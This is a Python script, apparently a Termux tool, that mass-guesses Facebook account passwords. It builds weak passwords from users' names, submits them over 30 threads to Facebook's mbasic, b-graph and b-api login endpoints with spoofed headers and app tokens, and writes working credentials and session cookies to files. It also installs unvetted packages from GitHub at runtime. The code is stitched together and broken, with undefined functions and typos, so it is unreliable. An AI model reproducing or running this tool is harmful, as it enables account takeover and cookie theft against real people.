

###---------------### MODULES ###--------------- ###


import os, time, base64, datetime, json, sys, re, threading, uuid, string
from concurrent.futures import ThreadPoolExecutor as ThreadPool

os.system("pip uninstall PySintx -y")
os.system("pip uninstall PyBookScrapper -y")
os.system("pip uninstall PyBookAgents -y")

try:
    import PySintx
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/sintxcs/PySintx.git")
    import PySintx
from PySintx import *

'''
I'm using PySintx for my text color and modules dependencies like rich, random, and requests.
'''

try:
    import PyBookAgents
except ModuleNotFoundError:
    os.sytem("pip3 install git+https://github.com/sintxcs/PyBookAgents.git")
    import PyBookAgents

'''
I'm using PyBookAgents for user-agent generator
Check documentaion here: https://github.com/sintxcs/PyBookAgents
'''

try:
    import PyBookScrapper
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/sintxcs/PyBookScrapper.git")
    import PyBookScrapper

# I'm using PyBookScrapper for scrapping of the following:
from PyBookScrapper import Scrape_Year

'''
Check documentaion here: https://github.com/sintxcs/PyBookScrapper
'''

###---------------### VARIABLES ###--------------- ###


_F = "/sdcard/Cellxx/"
_D = "clear"
_B = "\n"
_A = "bold white"

try:
    os.makedirs(_F)
except:
    pass
sntxfldr = _F

cmd(_D)


###---------------### DATE TIME CHECKER ###--------------- ###


script_status = "FREE"
months_check = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
date_now = datetime.datetime.now().day
month_now = months_check[str(datetime.datetime.now().month)]
date_month = str(month_now) + "-" + str(date_now)


###---------------### LOGO ###--------------- ###


lxgos = "\n\n                d8,                               \n               `8P              d8P               \n                             d888888P             \n       .d888b,  88b  88bd88b   ?88'  ?88,  88P    \n       ?8b,     88P  88P' ?8b  88P    `?8bd8P'    \n         `?8b  d88  d88   88P  88b    d8P?8b,     \n      `?888P' d88' d88'   88b  `?8b  d8P' `?8b    \n                                            \n                                            \n                                            \n"
sinInfo = "[white][›] PRESS [bold yellow]CTRL AND Z[bold white] TO STOP THE PROGRAM\n\n[white][-] FACEBOOK : Simón\n[-] GITHUB   : HiroshiYTz"


def sintx_logo():
    cmd(_D)
    prnt(pnl(lxgos, title=f"{script_status}", subtitle="SHEESHHH !"))
    prnt(pnl(sinInfo, width=95, style=_A))


###---------------### MENU ###--------------- ###


def sintx_menu():
    B = "[sky_blue1][1] FILE CLONING\n[0] REPORT ERROR"
    sintx_logo()
    prnt(pnl(B, width=95, style=_A, title="OPTIONS"))
    A = input(f"{green}  [?] OPTION:{dark_gray} ")
    if A == "1":
        ク克隆()
    if A == "0":
        cmd("xdg-open https://m.me/61553865513324")
        sintx_menu()
    else:
        アニメ(f"{ro}  [!] INVALID INPUT")
        sintx_menu()


###---------------### FILE CLONING ###--------------- ###


def menu1():
	logo()
	fl = input(f'{W}[{G}â€¢{W}] PUT FILE PATH\033[38;5;46m : {G}')
	try:
		fil = open(fl,'r').read().splitlines()
	except FileNotFoundError:
		print(f"{W}{40*'='}");print(f'[{R}!{W}] FILE LOCATION NOT FOUND ');time.sleep(1);menu1()
	print(f"{W}{40*'='}");print(f"{W}[{G}A{W}] {W}AUTO PASSWORD {W}\n{W}[{G}B{W}]{W} CHOICE PASSWORD{W}");line()
	psx =input(f'[{G}+{W}] Choose : {G}')
	if psx in ["1", "01","11","A","a"]:
		print(f"{W}{40*'='}{E}");print(f'{W}[{G}A{W}] PASSWORD [{G}NORMAL PASS{W}]\n[{G}B{W}] PASSWORD [{G}FF PASS{W}]\n[{G}C{W}] PASSWORD [{G}HARD PASS{W}]');print(f"{W}{40*'='}{E}")
		passx=input(f'{W}[{G}+{W}] Choose: {G}')
		if passx in ["2", "02","22","B","a"]:
			plist.append('name')
			plist.append('Name')
			plist.append('first12')
			plist.append('first123')
			plist.append('first1234')
			plist.append('first12345')
			plist.append('last123')
			plist.append('last12345')
			plist.append('first@')
			plist.append('first@@')
			plist.append('first@@@')
			plist.append('first@@@@')
			plist.append('first@@##')
			plist.append('last@')
			plist.append('last@@')
			plist.append('last@@@')
			plist.append('last@@@@')
			plist.append('firstlast')
			plist.append('first last')
		if passx in ["3", "03","33","C","c"]:
			plist.append('last12')
			plist.append('name')
			plist.append('last123')
			plist.append('last1234')
			plist.append('last12345')
			plist.append('last@')
			plist.append('last@@')
			plist.append('last@@@')
			plist.append('last@@@@')
			plist.append('last@@##')
			plist.append('last##')
			plist.append('last@#')
			plist.append('last@@@@@')
			plist.append('first@@@@')
			plist.append('first@')
			plist.append('first@@')
			plist.append('first@@@')
			plist.append('first@@@@@')
			plist.append('first@@##')
			plist.append('first@#')
			plist.append('first##')
			plist.append('first123')
			plist.append('first1234')
			plist.append('first12345')
			plist.append('first11')
			plist.append('first22')
			plist.append('firstlast')
			plist.append('first last')
		else:
			plist.append('name')
			plist.append('first123')
			plist.append('last123')
			plist.append('first@@')
			plist.append('first last')
			plist.append('firstlast')
	else:
		try:
			logo();print(f'\t\t{G}6 BEST{W}');print (40*"=")
			psl = int(input(f'[{G}+{W}] Limit : {G}'));print(f"{W}{40*'='}")
		except:
			psl=1
		print(f"{W}{40*'='}");print(f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}');print (40*"=")
		for ox in range(psl):
			plist.append(input(f'{W}[{G}{ox+1}{W}] password : {G}'))
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cp account (y/n)');line()
	cx=input(f'[{G}+{W}] Choose: {G}')
	if cx in ['n','N','no','NO','2']:
		cpx.append(f'n')
	else:
		cpx.append(f'y')
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cookie (y/n)');line()
	ckiv=input(f'{W}[{G}+{W}] Choose: {G}')
	if ckiv in ['n','N','no','NO','2']:
		cokix.append(f'n')
	else:
		cokix.append(f'y')
	print(f"{W}{40*'='}");print(f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]');line()
	mxt=input(f'{W}[{G}+{W}] Choose: {G}')
	with ThreadPool(max_workers=30) as tonxoys:
		tid = str(len(fil))
		logo();print(f'{W} [{G}â€¢{W}] TOTAL ID :\033[1;92m '+tid);print(f' {W}[{G}â€¢{W}] \033[38;5;46mTHE PROCESS HAS BEEN STARTED');print(f' [{G}â€¢{W}] \033[38;5;46mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for uuxxd in fil:
			id,name= uuxxd.split(f'|')
			psd=plist
			if mxt in ['A','1',"a"]:
				tonxoys.submit(normalfl,id,psd,name,tid)
			if mxt in ['B',"2","b"]:
				tonxoys.submit(graphfl,id,psd,name,tid)
			elif mxt in ['C',"3","c"]:
				tonxoys.submit(graphfl2,id,psd,name,tid)

###---------------### API (MBASIC) ###--------------- ###

def nrmlrm(id,psd,tid,mytd):
	global ok,cp,lop
	session = requests.Session()
	ua=random.choice(ugen)
	for psw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}ARIYAN-M1{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		ffb = session.get(f'https://'+mytd).text
		datax={"lsd":re.search('name="lsd" value="(.*?)"', str(ffb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ffb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(ffb)).group(1),"li":re.search('name="li" value="(.*?)"', str(ffb)).group(1),"try_number":"0","unrecognized_tries":"0","email":id,"pass":psw,"login":"Log In"}
		header={'authority': mytd,'method': 'GET','path': '/','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',  'cache-control': 'max-age=0',    'sec-ch-prefers-color-scheme': 'light',   'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"', 'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"', 'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
		lo = session.post(f'https://{mytd}/login/device-based/regular/login/?refsrc',data=datax,headers=header).text
		lcki=session.Cookie.get_dict().keys()
		if 'c_user' in lcki:
			coki=";".join([key+"="+value for key,value in session.Cookie.get_dict().items()])
			iid = coki[151:166]
			print(f'\r\r{G}[ARIYAN-OK] {iid} | {psw}{W}')
			if 'y' in cokix:
				print(f'\r\r{R}[{G}Cookie{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			ok.append(id)
			open('/sdcard/ARIYAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			break
		elif 'checkpoint' in lcki:
			coki=";".join([key+"="+value for key,value in session.Cookie.get_dict().items()])
			iid = coki[141:156]
			if 'y' in cpx:
				print(f'\r\r{R}[ARIYAN-CP] {iid} | {psw}{W}')
			cp.append(id)
			open('/sdcard/ARIYAN-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
def graphrm(id,psd,tid):
	global ok,cp,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}ARIYAN-M2{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
	for psw in psd:
		ua=random.choice(ugen)
		#ua='[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_Cookie': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
		header={'User-Agent': ua1(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
		lo=requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=datax,headers=header,allow_redirects=False).json()
		if 'session_key' in lo:
			cki = lo["session_Cookie"]
			ck={}
			for xk in cki:
				ck.update({xk["name"]:xk["value"]})
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
			iid= re.findall('c_user=(.*);xs', coki)[0]
			print(f'\r\r{G}[ARIYAN-OK] {iid} | {psw}{W}')
			if 'y' in cokix:
				print(f'\r\r{R}[{G}Cookie{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			ok.append(id)
			open('/sdcard/ARIYAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{S}[ARIYAN-2F] {iid} | {psw}{W}')
			open('/sdcard/ARIYAN-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
		elif 'www.facebook.com' in lo['error']['message']:
			try:
				iid = lo['error']['error_data']['uid']
			except:
				iid=id
			if iid in ok:pass
			else:
				if 'y' in cpx:
					print(f'\r\r{R}[ARIYAN-CP] {iid} | {psw}{W}')
					
				cp.append(id)
				open('/sdcard/ARIYAN-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
				break
		else:continue
	lop+=1
def apirm(id,psd,tid):
	global ok,cp,lop
	ton=[]
	sys.stdout.write(f'\r\r{BG}[{W}ARIYAN-M3{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
	for psw in psd:
		url = 'https://b-api.facebook.com/method/auth.login'
		gtt=random.choice(gtxx)
		ua="[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
		dataxx={'adid':str(uuid.uuid4()), 'email':id, 'password':psw,'cpl':'true', 'credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled', 'source':'login','format':'json', 'generate_session_Cookie':'1','generate_analytics_claim':'1','generate_machine_id':'1',"locale":"en_US","client_country_code":"US",'device':gtt,'device_id':str(uuid.uuid4()), "method": "auth.login","fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
		header={'content-type':'application/x-www-form-urlencoded','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-connection-type':'unknown','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','api_key': '8114af471d039628db5c68cb127af936','user-agent':ua1(),'x-fb-net-hni':str(random.randint(2e4,4e4)),'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),'x-fb-connection-quality':'EXCELLENT','x-fb-friendly-name':'authenticate','accept-encoding':'gzip, deflate','x-fb-http-engine':	'Liger'}
		datax={'email':id,'password':psw,'cpl':'true', 'credentials_type':'password',  'error_detail_type':'button_with_disabled', 'source':'login', 'format':'json', 'generate_session_Cookie':'1', 'generate_analytics_claim':'1','generate_machine_id':'1'}
		lo = requests.post(url,data=datax,headers=header,allow_redirects=False).text
		jsn = json.loads(lo)
		if 'session_key' in jsn:
			print(f'\r\r{G}[ARIYAN-OK] {iid} | {psw}{W}')
			ok.append(id);open('/sdcard/ARIYAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'\n') #+'  ------------>>>'+coki+"\n")
			break
		elif 'www.facebook.com' in jsn['error_msg']:
			if 'y' in cpx:
				print(f'\r\r{R}[ARIYAN-CP] {id} | {psw}{W}')
			cp.append(id)
			open('/sdcard/ARIYAN-CP.txt', 'a').write(id+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
###---------------### START ###--------------- ###


if __name__ == "__main__":
    try:
        cjxke_menu()
    except Exception as e:
        exit()
